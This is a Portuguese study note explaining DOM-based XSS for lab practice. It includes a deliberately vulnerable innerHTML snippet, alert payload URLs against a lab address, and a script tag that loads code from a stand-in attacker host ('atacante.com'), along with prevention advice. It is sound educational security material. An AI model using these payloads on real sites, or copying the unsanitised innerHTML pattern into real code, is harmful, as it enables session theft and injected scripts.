## O que é DOM-Based XSS?

[[5 - LABS - XSS Dom Based]]

**DOM-Based XSS** é uma vulnerabilidade de execução de código malicioso onde o ataque ocorre **inteiramente no lado do cliente (frontend)**, sem qualquer interação com o servidor (backend). A vulnerabilidade é explorada através da manipulação do **DOM (Document Object Model)** via JavaScript mal implementado.

---

### Como funciona?

1. O usuário acessa uma URL com um parâmetro malicioso (por exemplo: `?search=<script>alert('XSS')</script>`).
    
2. O código JavaScript da página coleta esse valor da URL (por exemplo, usando `URLSearchParams`).
    
3. O valor é **inserido diretamente** no DOM com `innerHTML`, `document.write`, ou métodos semelhantes, **sem sanitização**.
    
4. O navegador interpreta o valor como HTML e executa o JavaScript injetado.
    

---

### Diferença entre DOM-Based, Stored e Reflected XSS:

|Tipo de XSS|Interação com backend?|Persistente?|Exemplo de origem|
|---|---|---|---|
|Reflected|Sim|Não|Query string (URL)|
|Stored|Sim|Sim|Comentários, perfis|
|**DOM-Based**|**Não**|Não|Frontend (JS local)|

---

### Exemplo prático explicado:

Imagine uma URL como:

```
http://10.10.0.3/?search=teste
```

No JavaScript da página, o código pode estar assim:

```javascript
const params = new URLSearchParams(window.location.search);
const pesquisa = params.get("search");

if (pesquisa) {
  document.getElementById("searchmessage").innerHTML = `0 resultados para ${pesquisa}`;
}
```

Se você acessar:

```
http://10.10.0.3/?search=<b style="color:red">XSS</b>
```

A página exibirá:

> 0 resultados para **XSS** (em vermelho)

Porque o conteúdo da URL foi **injetado diretamente no HTML da página**, sem limpeza.

Agora, se você acessar:

```
http://10.10.0.3/?search=<script>alert('DOM XSS')</script>
```

O alerta será executado — isso é **DOM-Based XSS**.

---

### Por que é perigoso?

- **O servidor nem sabe que foi explorado**.
    
- Pode **bypassar firewalls** ou WAFs que analisam apenas o tráfego para o backend.
    
- O código malicioso pode ser **armazenado em links compartilhados**.
    
- Permite ataques como:
    
    - Roubo de sessão (`document.cookie`)
        
    - Keyloggers
        
    - Redirecionamentos maliciosos
        
    - Injeção de scripts externos (ex: `<script src="http://atacante.com/xss.js"></script>`)
        

---

### Como prevenir?

1. **Nunca usar `innerHTML`** com conteúdo não sanitizado.
    
2. Preferir `textContent` ou `innerText` para inserção de texto dinâmico.
    
3. Usar bibliotecas de sanitização como [DOMPurify](https://github.com/cure53/DOMPurify).
    
4. Validar e codificar entradas mesmo no frontend.
    
5. Usar políticas de segurança como **Content-Security-Policy (CSP)**.
